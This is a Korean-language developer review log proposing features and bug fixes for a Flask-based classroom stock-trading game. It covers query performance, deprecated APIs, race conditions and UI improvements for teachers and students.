- **`join_room()` — 진행자가 자신의 방에 참여자로 중복 가입 가능** (`app.py:493-507`, `join_room()`): `join_room()` 의 분기 로직 `if room.host_id != user.id and not RoomMember.query...` 은 호스트가 본인 방에 참여자로 join을 시도하면 `room.host_id != user.id` 가 True가 되지 않아 진입 안 하는 것처럼 보이지만, 실제로는 조건이 `False and ...` 로 단락 평가되어 `RoomMember` 가 생성되지 않음 — 이 부분은 맞음. 그러나 진행자가 다른 브라우저에서 학생 코드로 로그인한 뒤 동일 코드로 join하면 `user.id`가 다른 사용자이므로 참여자 등록이 될 수 있음. 더 심각한 경로: 호스트가 실수로 학생 화면에서 방 코드를 입력하면 `room.host_id == user.id` 이므로 `RoomMember`는 추가되지 않지만 `room_dict(room, user.id)` 가 `is_host: True` 를 반환해 학생 UI가 진행자 화면으로 전환됨. `join_room()` 맨 앞에 `if room.host_id == user.id: return jsonify({'error': '진행자는 참여자 코드로 입장할 수 없습니다.'}), 400` 을 추가하면 혼동 방지.

---

## 2026-08-10

### 추가하면 좋을 기능

- **참여자 순위 탭 자동 갱신** (`app.js:271-276`, `enterHostGame()` 폴링 루프; `app.js` 참여자 폴링 섹션): 진행자 화면은 10초마다 `loadHostMembers()`를 자동 갱신하지만, 참여자의 순위 탭(`pg-rankings`)은 `showPage('rankings')` 전환 시 1회만 로드 후 자동 갱신이 없음. 참여자 10초 폴링 루프(`S.pollInterval` setInterval) 내 `if (S.currentPage === 'rankings') loadRankings()` 조건 1줄 추가로 해결 가능. 서버 변경 불필요, 학생들이 순위 변동을 실시간 체감.

- **대형 거래 확인 대화상자** (`app.js` `execTrade()` 함수, `index.html:734-736` 매수·매도 버튼): 현재 "▲ 매수" 버튼 클릭 시 즉시 `execTrade('BUY')` 실행. 총 자산의 30% 초과 거래 발생 시 `if (amount > S.room.starting_cash * 0.3 && !confirm(\`${krw(amount)} 매수하시겠습니까?\`)) return;` 한 줄 추가로 실수 방지. 청소년 학습 환경에서 '잘못 눌러서 전 재산 날렸어요' 민원 예방에 직결.

- **참가자 개인 거래 내역 CSV 내보내기** (`app.py:916-935`, `get_transactions()`; `app.py:1474-1542`, `export_rankings()`; `index.html:386-403` 포트폴리오 탭): 진행자만 Excel 다운로드 가능하고 학생 개인의 전체 거래 기록을 수업 후 보관할 방법 없음. 기존 `GET /api/rooms/<rid>/transactions` 에 `?export=csv` 파라미터 추가 시 30줄 미만: Flask `Response(csv_text, mimetype='text/csv', headers={'Content-Disposition': f'attachment;filename={room.name}_내거래.csv'})` 반환. 포트폴리오 탭 하단에 "📥 내 거래 기록 저장" 버튼 추가. 학생이 수업 후 본인 전략 복기 가능.

- **진행자 퀴즈 응답 현황 대시보드** (`app.py:1316`, `_quiz_history: dict`; `app.py:1391-1397`, `get_quiz_history()`; `app.py:643-649`, `host_members()`): `_quiz_history[(room_id, user_id)]`에 모든 학생 퀴즈 기록이 저장되어 있으나 진행자가 볼 수 있는 API가 없음. `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트 추가: 학생별 정답 수 / 오답 수 / 정답률을 `_quiz_history` 에서 집계해 반환(10줄). 진행자 설정 탭에 "🧠 퀴즈 현황" 섹션 추가. 교사가 어떤 학생이 경제 개념을 어려워하는지 파악 가능.

- **게임 진행 중 참여자 강퇴 기능** (`app.py:651-662`, `kick_member()`): 현재 `if room.status != 'waiting': return jsonify({'error': ...}), 400` 제약으로 게임 중 강퇴 불가. 진행 중 강퇴 시에는 보유 주식을 시장가로 정산하고 `RoomMember` 삭제 + `RoomHolding` 삭제 + 해당 멤버 `_member_locks` 정리 로직 추가 필요(약 20줄). 문제 학생 발생 시 교사가 대응 불가한 상황 해소.

- **보유 종목 평균 매수가 기준선을 차트에 표시** (`app.js` `loadChart()` 및 `openStockModal()`; `app.py:866-899`, `get_portfolio()`): 종목 차트 모달에 현재가만 표시, 학생이 보유 중일 때 "지금 팔면 수익인지 손실인지" 시각화 없음. `openStockModal()` 에서 포트폴리오 보유 데이터의 `avg_price`를 읽어 Chart.js `datasets[1]` 점선(`borderDash: [5,5]`)으로 수평선 추가(10줄). 서버 변경 불필요. "내 평균 매수가가 여기고 지금 가격이 여기니까 수익이야" 직관적 학습 가능.

- **외부 CDN 스크립트 로컬 파일로 대체** (`index.html:998-999`): `chart.js@4.4.0`과 `qrcodejs@1.0.0`을 CDN에서 로드. 학교 와이파이가 외부 CDN을 차단하는 경우 차트와 QR이 모두 작동 불가. `static/js/` 하위에 두 파일을 저장하고 `src` 경로를 `/static/js/chart.umd.min.js`, `/static/js/qrcode.min.js`로 변경(파일 2개 추가, HTML 2줄 수정). 오프라인 교실 환경 대응.

### 제거/단순화할 것들

- **`get_history()` 가짜 차트 데이터 — 게임 내 실제 가격 이력으로 교체 권장** (`stock_service.py:303-332`, `get_history()`): 종목 차트 클릭 시 `get_history()`가 매번 새로 생성한 랜덤 OHLC 데이터를 반환함. 이 데이터는 실제 게임 내 가격 변동(`_prices` 딕셔너리)과 전혀 연관이 없어, 학생이 "삼성전자 차트가 계속 오르니까 매수!"라고 판단해도 실제 게임 가격은 하락 중일 수 있음. `StockService.__init__()` 에 `_price_history: dict = {}` (symbol → deque(maxlen=200)) 추가, `get_price()` 내 가격 갱신 시점마다 `self._price_history[sym].append((now, new_price))`로 기록. `get_history()`는 이 실제 기록을 가공해 반환. 서버 약 15줄 수정, 차트 신뢰도 대폭 향상.

- **`_member_locks` 딕셔너리 무한 증가** (`app.py:109-119`, `_get_member_lock()`; `app.py:259-261`, `_end_room()`): `_member_locks`는 `(room_id, user_id)` 키로 증가하며 `_end_room()` 에서만 정리됨. 방이 정상 종료되지 않고 서버가 재시작된 경우(Render 무료 플랜에서 빈번) 이전 게임의 락 객체가 남음. 실용적 해결: `_member_locks_meta` Lock 하에 `_member_locks[key]`의 `weakref` 래핑 또는, 더 간단하게 `RoomMember` 조회 실패 시 락 자동 제거 로직 추가.

- **인메모리 게임 상태가 Render 슬립 재시작 시 초기화** (`app.py:267`, `_lots`; `app.py:1314-1316`, `_quiz_state/_quiz_history/_quiz_settings`; `app.py:351-353`, `_rlt_active/_roulette_config`): Render 무료 플랜은 15분 비활동 시 프로세스 종료. `_lots` (복권 현황)는 `lottery_rounds_done` 컬럼으로 부분 복구 가능하지만(`app.py:275-279`), `_quiz_state` (쿨다운)·`_quiz_history`·`_rlt_active` (스핀 횟수 외)는 완전 소멸. 퀴즈 스핀 횟수는 `RoomTransaction.query.filter_by(action='RLT')` count로 DB에서 복원 가능하므로(`app.py:1109`), 나머지 쿨다운·히스토리도 `RoomTransaction`에 기록하거나 별도 DB 테이블로 이관 권장.

- **`Room.query.get_or_404()` 패턴 → SQLAlchemy 2.x 권장 방식으로 교체** (`app.py:533`, `536`; `app.py:576`, `579` 등 약 30곳): Flask-SQLAlchemy 3.x에서 `Model.query` 는 레거시로 분류되고 `Model.query.get_or_404(rid)` 는 `db.get_or_404(Model, rid)` 또는 `db.session.get(Model, rid)` 로 교체 권장. 현재 `db.session.get()` 패턴도 혼재(`app.py:386`, `470` 등)되어 코드 일관성 부재. 전체 교체 시 SQLAlchemy 2.x 경고 제거.

- **`models.py` 전체 `datetime.utcnow` → timezone-aware 교체** (`models.py:21`, `37-38`, `53`, `79`, `92`): `default=datetime.utcnow` 패턴은 Python 3.12에서 DeprecationWarning 발생, 3.14에서 제거 예정. `from datetime import timezone` 추가 후 `default=lambda: datetime.now(timezone.utc).replace(tzinfo=None)`로 일괄 변경(5개 컬럼). `app.py` 내 직접 `datetime.utcnow()` 호출 25+ 곳도 동일 대응 필요.

- **`starting_cash` 컬럼 타입이 `Float`** (`models.py:33`, `starting_cash = db.Column(db.Float)`): 원화(KRW)는 소수점 없는 정수 통화이므로 `Float` 대신 `Integer`(또는 `BigInteger`)가 적합. 현재 `m.cash += price * shares` 같은 float 연산 누적으로 `m.cash = 9999999.9999997` 형태의 부동소수점 오차가 쌓이며, `export_rankings()`에서 `round(..., 0)` 처리(`app.py:1167`)로 은폐 중. 정수형 전환 시 `FLOAT → INTEGER` 마이그레이션 필요, `_end_room()` 내 이자 계산(`round(d.amount * d.rate / 100 * ratio, 0)`) 결과를 `int()`로 캐스팅하는 방식으로 연산 체인 정리 가능.

- **`doForcePrice()` / `doMarketEvent()` 내 지역변수 `pct`가 전역 포매터 함수 `pct`를 섀도잉** (`app.js:49`, 전역 `const pct = n => ...`; `app.js:364`, `doForcePrice()` 내 `const pct = ...`; `app.js:377`, `doMarketEvent()` 동일): 두 함수 내에서 `const pct = quickPct !== undefined ? quickPct : parseFloat(...)` 지역변수 선언으로 전역 `pct()` 포매터 함수가 가려짐. 현재는 해당 함수 내부에서 전역 `pct()`를 호출하지 않아 오류 없지만, 향후 유지보수 중 `pct(value)` 호출 추가 시 `TypeError: pct is not a function` 즉시 발생. 지역변수 이름을 `pctValue`로 변경하는 2줄 수정으로 해소.

## 2026-08-10 (2차)

### 추가하면 좋을 기능

- **진행자 학생 개별 포트폴리오 뷰** (`app.py:700-721`, `host_member_transactions()`; `app.js:410-433`, `loadHostMembers()`): 진행자가 학생 행의 "거래" 버튼을 클릭하면 거래 내역 모달이 열리지만, 현재 보유 종목·평균 매수가·평가손익은 전혀 보이지 않음. `GET /api/rooms/<rid>/host/members/<uid>/portfolio` 엔드포인트를 신설해 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)`와 현재 시세를 결합한 포트폴리오 데이터를 반환(서버 15줄, 기존 `get_portfolio()` 로직 재활용). 학생 거래 내역 모달 상단에 "현재 보유 종목" 카드를 추가해 종목명·수량·평가손익을 한눈에 표시. 교사가 "왜 삼성전자에 집중했나요?" 발문 시 실시간 근거 확보 가능. 서버 약 15줄 + 클라이언트 모달 수정 20줄.

- **"같은 설정으로 다시 시작" Rematch 버튼** (`app.py:464-491`, `create_room()`; `app.js:122-141`, `doCreateRoom()`; `index.html` 결과 화면): 교사가 반마다 같은 게임을 반복하려면 방 이름·시간·시작자금·예금 금리를 매번 처음부터 입력해야 함. 결과 화면에 "🔄 같은 설정으로 새 게임" 버튼 1개를 추가하고, 클릭 시 `S.room.starting_cash / duration_minutes / deposit_rate`를 그대로 읽어 `doCreateRoom()`과 동일한 흐름으로 `/api/rooms`에 POST. 방 이름만 `${oldName} (2차)` 처럼 자동 접미사 부여해 기존 방과 구분. 서버 변경 불필요, 클라이언트 약 15줄. 3~4교시 연속 수업에서 가장 빈번한 반복 작업 제거.

- **섹터 히트맵 위젯** (`app.py:745-765`, `get_stocks()`; `app.js:316-360`, `loadHostMarket()` / 참여자 시장 탭): 개별 주가 카드 60개+를 스크롤하지 않고도 섹터 단위 등락을 한눈에 파악할 수 있는 히트맵이 없음. `GET /api/rooms/<rid>/stocks` 응답 데이터를 클라이언트에서 섹터별로 그룹핑해 `change_pct` 평균을 계산한 뒤, 진행자 마켓 탭 상단과 참여자 시장 탭 상단에 섹터별 2×3 격자 타일(배경색: 등락률에 비례한 green/red 그라디언트)로 렌더링. 서버 변경 불필요, JS 집계 로직 약 20줄 + CSS. 교사가 "오늘 배터리 섹터가 왜 빨간지 이야기해 봅시다"를 즉각 발문 가능.

- **진행자 참여자 메시지 방송 기능** (`app.py:724-795`, 진행자 API 패턴 참조; `app.js:810-822`, `startNewsPolling()`): 진행자가 수업 중 "지금 삼성SDI 뉴스 주목!" 같은 개입 지시를 학생 화면에 실시간 전달할 방법이 없음. `POST /api/rooms/<rid>/host/broadcast` 엔드포인트를 추가해 메시지를 `_broadcast: dict = {}` (room_id → {text, ts})에 저장(서버 약 8줄). 기존 `GET /api/rooms/<rid>/news` 응답에 `broadcast` 필드를 포함시키거나 별도 필드로 반환하면 참여자의 8초 뉴스 폴링에서 자동으로 수신. 수신 시 `toast(data.broadcast.text, 'info')` 로 표시(클라이언트 5줄). 진행자 설정 탭에 텍스트 입력 + "전송" 버튼 추가. 서버 8줄 + 클라이언트 10줄. 수업 개입 도구로 즉각 활용 가능.

- **학생 포트폴리오 집중도 경고 배지** (`app.js:1570-1591`, `loadPortfolio()` 내 `hList.innerHTML` 렌더; `app.py:868-899`, `get_portfolio()`): 참여자 포트폴리오 탭에서 단일 종목에 총 자산의 70% 이상을 투자 중인 경우를 감지해 경고 배지를 표시하는 기능이 없음. `loadPortfolio()` 내 `data.holdings`를 렌더링한 직후, 최대 비중 종목이 `current_value / data.total_value > 0.7`이면 포트폴리오 상단에 `<div class="chip chip-down">⚠️ 집중 투자 경고: ${h.name}에 ${pct(ratio*100)} 몰빵</div>` 배지를 삽입(약 8줄). 서버 변경 불필요. "왜 분산 투자가 중요한지" 개념을 실시간 경험으로 가르치는 핵심 교육 기회 제공.

### 제거/단순화할 것들

- **`lobby_members()` N+1 쿼리 — 학생 40명 입장 시 41회 DB 조회** (`app.py:664-675`, `lobby_members()`): `for m in RoomMember.query.filter_by(room_id=rid).all(): u = db.session.get(User, m.user_id)` 패턴으로 멤버 1쿼리 + 학생 수 N쿼리가 발생. 대기 로비가 5초마다 `loadLobbyMembers()`를 폴링(`app.js:194`)하므로, 40명 대기 중이면 5초마다 41쿼리. 수정: `uids = [m.user_id for m in members]`; `user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}`로 2쿼리로 압축. `_compute_leaderboard()`(`app.py:157`)에서 이미 동일한 패턴을 사용하고 있어 1:1로 재활용 가능. 코드 5줄 수정, 쿼리 수 N+1 → 2로 감소.

- **`refreshMyRank()` — 전체 리더보드(N+1 쿼리)를 내려받아 자신 1줄만 사용** (`app.js:738-756`, `refreshMyRank()`; `app.py:904-912`, `get_rankings()`): 참여자가 10초 폴링마다 `GET /api/rooms/<rid>/rankings`를 호출해 `_compute_leaderboard()`(학생 수 × 2 DB 쿼리) 결과 전체를 받은 뒤 `data.find(e => e.is_me)`로 자신 1줄만 사용. 30명 클래스에서 학생 30명 × 10초 폴링 × 60쿼리 = 초당 180 DB 쿼리가 순위바 한 줄 갱신을 위해 발생. `GET /api/rooms/<rid>/my-rank` 전용 엔드포인트 신설(`app.py:908` 위치, `_compute_leaderboard()` 대신 `member_total_value(rid, uid)` 1회 + SQL `COUNT(*)` + `ORDER BY` 없이 Python 비교 대신 서브쿼리)로 2쿼리로 처리. 클라이언트 URL 1줄 교체. 대규모 교실에서 DB 부하 획기적 감소.

- **`join_room()` — 게임 진행 중(active/paused) 신규 참여 허용 → 중간 입장 불공정** (`app.py:493-508`, `join_room()`): `room.status == 'ended'`만 차단하고 `active`/`paused` 상태를 차단하지 않아, 뒤늦게 접속한 학생이 `cash=room.starting_cash`(시작 자금 전액)으로 아무 손실 없이 게임 중간에 합류 가능. 특히 게임 후반부에 합류해 잘 올라간 종목만 단타로 매수·매도 시 조작적 고득점이 가능. 수정: `join_room()` 내 `app.py:498`에 `if room.status in ('active', 'paused'): return jsonify({'error': '이미 시작된 게임에는 참여할 수 없습니다.'}), 400` 1줄 추가. 부득이하게 지각 학생을 게임에 넣어야 할 경우를 위해 진행자 전용 `POST /api/rooms/<rid>/host/add-member` 엔드포인트를 별도로 만들고 `joining_cash` 옵션(현재 평균 자산 등)도 설정 가능.

- **`minigame_spin()` — `total_assets` 계산이 멤버 락 밖에서 실행돼 TOCTOU 가능** (`app.py:1120-1132`, `minigame_spin()`): `total_assets = member_total_value(rid, user.id)` 가 `_get_member_lock` 없이 실행되고, 이후 `if bet > total_assets: return 400` 검증도 락 밖에서 수행됨. 학생이 두 개의 브라우저 탭에서 동시에 스핀 요청을 보내면 두 요청이 모두 동일한 `total_assets` 값을 보고 베팅 한도를 통과한 뒤, 각자 `shortfall` 계산 후 현금 및 주식을 중복 차감할 수 있음. `minigame_spin()` 내 `app.py:1106` 다음 줄부터 `db.session.commit()` 까지를 `with _get_member_lock(rid, user.id): db.session.refresh(m)` 블록 안으로 이동하고 락 내부에서 `total_assets`와 베팅 한도를 재계산해야 함. `trade()`(`app.py:840`)에서 이미 동일한 패턴을 적용 중이므로 코드 구조 참고. 약 10줄 들여쓰기 수정.

- **`doLogout()` — `_stopLotPolling()` 미호출 → 로그아웃 후 최대 5초간 복권 API 추가 요청 발생** (`app.js:101-106`, `doLogout()`): `doLogout()`은 `stopPolling()`과 `stopTimer()`를 호출하지만, `_stopLotPolling()`을 호출하지 않음. 복권 진행 중 학생이 로그아웃하면 `_lotPollInterval` setInterval이 계속 실행되어 5초마다 `/api/rooms/${rid}/lottery`를 호출. 해당 요청은 401 반환 → `api.get()` 결과 `{error: 'HTTP 401'}` → `_checkLotteryStatus()`의 `if (!d || !d.state)` 조건으로 `_stopLotPolling()`이 최종 자정(self-heal)되지만, 불필요한 서버 호출 1회가 발생. `doLogout()` 의 `stopPolling()` 호출 다음 줄에 `_stopLotPolling();`을 추가(1줄)하면 즉시 해소. 동일한 이유로 `showLanding()`(`app.js:93`, `stopPolling()` 호출)에도 `_stopLotPolling()` 추가 필요.

- **`_compute_leaderboard()` — `uids`가 빈 배열일 때 `User.id.in_([])` 빈 IN 절 생성** (`app.py:155-161`, `_compute_leaderboard()`): 방 참가자가 0명인 경우(게임 시작 전 누군가 모두 나간 경우) `uids = []`가 되어 `db.session.query(User).filter(User.id.in_([])).all()` 가 실행됨. SQLAlchemy는 빈 IN 절을 `WHERE 1!=1`로 변환해 빈 리스트를 반환하므로 일반적으로 안전하지만, 일부 오래된 SQLite 버전에서 `IN ()` 구문 오류가 발생할 수 있고 PostgreSQL 방언에서도 동작이 다를 수 있음. `if not uids: return []` 조기 반환을 `app.py:156` 직후에 추가하면 빈 배열 처리를 명시적으로 처리하고 불필요한 DB 쿼리도 생략 가능. 1줄 추가로 방어 코드 완성, `host_members()` / `get_rankings()` / `export_rankings()` 모두 혜택.


---

## 2026-08-11

### 추가하면 좋을 기능

- **게임 종료 카운트다운 취소 기능** (`app.py:628-638`, `end_room()`): 진행자가 "게임 종료" 버튼을 누르면 1분 카운트다운이 시작되고(`_ending_soon.add(rid)`, `room.end_time = now + 60s`) 프론트 버튼이 즉시 비활성화됨(`app.js:544-550`). 실수로 눌렀을 때 취소 방법이 전혀 없음. `POST /api/rooms/<rid>/cancel-end` 엔드포인트를 신설해 `room.id in _ending_soon`일 때만 `_ending_soon.discard(rid)`로 제거하고 `room.end_time`을 `paused_at`을 고려해 복원하면 됨. 진행자 설정 탭에 "⏰ 종료 취소" 버튼 추가. 수업 환경에서 실수 복구가 중요하므로 우선순위 높음.

- **학생 접속 현황 표시 (진행자 대시보드)** (`app.py:643-649`, `host_members()` / `app.js:410-432`, `loadHostMembers()`): 진행자 순위 탭은 총자산 정보를 보여 주지만 어떤 학생이 "지금 접속 중"인지 알 방법이 없음. `RoomMember`에 `last_seen = db.Column(db.DateTime, nullable=True)` 컬럼을 추가하고, `get_room()` 또는 `get_stocks()` 요청 시마다 `member.last_seen = datetime.utcnow()`로 갱신하면 됨. `host_members()` 응답에 `last_seen`을 포함하고 클라이언트에서 "5분 이상 활동 없음" 학생을 회색 표시하면 진행자가 네트워크 문제 학생을 즉시 파악 가능. DB 마이그레이션 1줄 + 라우트 2~3줄.

- **게임 내 실제 가격 변동 로그를 차트로 표시** (`stock_service.py:303-332`, `get_history()`): 현재 차트 API는 현재가 기준 역방향 랜덤 OHLC를 생성하므로 게임 중 실제 가격과 완전히 무관. `StockService.__init__()`에 `self._price_log: dict = {}  # sym -> [(timestamp, price), ...]` 를 추가하고 `get_price()` 내 가격 갱신 시 `self._price_log.setdefault(symbol, []).append((now, new_price))`로 기록. `get_history()` 에서 로그 길이가 2 이상이면 실제 로그를 OHLC 버킷으로 요약해 반환하고 그 미만이면 현재 랜덤 방식 유지. 학생이 매수 시점의 실제 가격을 차트에서 확인해 투자 복기 가능 — 교육 효과 직결.

- **진행자 전체 학생 동시 퀴즈 출제 기능** (`app.py:1312-1342`, 퀴즈 라우트): 현재 퀴즈는 각 학생이 개별 시작·개별 응답하며 진행자가 개입 불가. 수업 도중 교사가 특정 개념을 확인하기 위해 직접 만든 O/X 문제를 전체 동시 출제하는 기능이 없음. `_host_broadcast_quiz: dict = {}  # room_id -> {q, a, expires}` 딕셔너리를 추가하고 `POST /api/rooms/<rid>/host/quiz-broadcast`로 문제·정답·만료 시각을 저장. `get_quiz()` 요청 시 해당 방의 브로드캐스트 퀴즈가 유효하면 우선 반환. 학생 응답은 기존 `submit_quiz()` 로직 재활용. 서버 약 20줄 + 진행자 탭 입력 UI 추가.

- **예금 탭 — 복수 예금 합산 현황 표시** (`app.js:1665-1690`, `loadDepositsPage()`): 현재 예금 탭은 개별 예금 항목을 나열하지만 "총 예금액", "총 예상 이자", "총 만기 수령액" 합계가 없음. `active` 예금 리스트가 내려오면 클라이언트에서 `active.reduce((s,d) => s+d.amount, 0)` / `active.reduce((s,d) => s+d.expected_interest, 0)` 를 계산해 목록 상단에 요약 카드(`총 예금 X원 · 예상 이자 +Y원 · 만기 수령 Z원`)로 표시하면 됨. 서버 변경 없이 약 10줄 추가. 학생이 자산 배분 현황을 한눈에 파악 가능.

### 제거/단순화할 것들

- **`_compute_leaderboard()` N+1 쿼리 문제 — 성능 병목** (`app.py:151-171`, `member_total_value()` at `app.py:138-149`): `_compute_leaderboard()`는 `member_total_value()`를 인원 수 N 만큼 루프 호출하고, `member_total_value()` 내부에서 holdings 쿼리 + deposits 쿼리 + `get_price()` 호출이 반복 발생해 N명 × 최소 2 쿼리 = 최소 2N DB 쿼리. 30명 참여 + 10초 폴링 시 분당 약 360회 이상 쿼리. `RoomHolding.query.filter_by(room_id=rid).all()` 과 `Deposit.query.filter_by(room_id=rid, status='active').all()` 을 루프 밖에서 한 번씩 실행해 uid별 딕셔너리로 만든 뒤 내부에서 직접 합산하면 2N → 2 쿼리로 줄어듦. Render 무료 플랜의 느린 SQLite에서 체감 차이 큼.

- **`api.get()`/`api.post()`가 HTTP 오류 시 서버 메시지를 버리고 `HTTP 4xx`만 반환** (`app.js:29-44`, `api` 객체): `if (!r.ok) return {error: \`HTTP ${r.status}\`}` 처리 때문에 서버가 `{'error': '유효하지 않은 방 코드입니다.'}` 를 보내도 프론트 에러 영역에는 "HTTP 404"만 표시됨. `app.js:31`: `if (!r.ok) { const body = await r.json().catch(() => ({})); return {error: body.error || \`HTTP ${r.status}\`}; }` 로 수정하면 실제 오류 메시지가 학생 화면에 출력돼 "왜 안 되지?" 혼란이 감소. `api.del()` 도 동일 수정 필요(`app.js:41`). 약 4줄 변경, 서버 변경 없음.

- **`Room.query.get_or_404()` 패턴이 20곳 이상 사용 — deprecated API** (`app.py:536`, `576`, `591`, `604`, `621`, `645`, `651`, `664`, `677` 등): Flask-SQLAlchemy 3.x에서 `Model.query.get_or_404(pk)`는 deprecated이며 `db.get_or_404(Model, pk)` 또는 `db.session.get(Model, pk) or abort(404)` 패턴으로 교체 권장. 현재는 동작하지만 패키지 업그레이드 시 Deprecation Warning이 대거 발생하거나 오류로 전환될 수 있음. `get_room()`, `start_room()`, `pause_room()`, `resume_room()`, `end_room()`, `host_members()`, `kick_member()` 등 전체적으로 일괄 치환 필요.

- **`stock_service.py:314-327` 차트 히스토리가 캐시 만료마다 완전히 다른 모양으로 재생성** (`stock_service.py:303-332`, `get_history()`): HISTORY_CACHE_TTL = 120초 만료 후 `random.gauss()` 시드 고정 없이 새 랜덤 데이터를 생성하므로 2분마다 차트가 완전히 다른 모양이 됨. 학생이 "아까 봤던 지지선이 어디에?" 하는 혼란이 발생. 단기 해결책: `random.seed(hash((symbol, period, int(time.time() // HISTORY_CACHE_TTL))))` 처럼 캐시 버킷 단위 고정 시드를 사용하면 같은 버킷 내 재생성 시 동일 모양 유지. 장기 해결책: 실제 가격 로그를 사용한 차트(Feature 3번 참조).

- **룰렛 자동 트리거 후 오프라인 학생이 `minigame/close` 를 보내지 않으면 게임이 영구 paused 고착** (`app.py:1065-1094`, `minigame_close()` / `_rlt_active[rid]['count']`): 룰렛 트리거 시 게임이 일시정지되고 `_rlt_active[rid]['count']`가 각 학생의 `minigame/open` 호출마다 증가하며, 모든 학생이 `minigame/close`를 보낼 때 0이 되어 게임이 종료됨. 오프라인이거나 탭을 닫은 학생은 `close`를 보내지 않아 카운터가 영원히 0이 되지 않음(`app.py:1072-1073`). `_rlt_active[rid]` 에 `started_at: float` 타임스탬프를 추가하고, `get_room()` 폴링 시 `time.time() - started_at > 300` (5분 초과)이면 강제로 `_end_room(room)`을 호출하는 타임아웃 로직이 필요. `get_room()` 내 `if room.rlt_triggered and room.status == 'paused':` 블록에 5줄 추가.

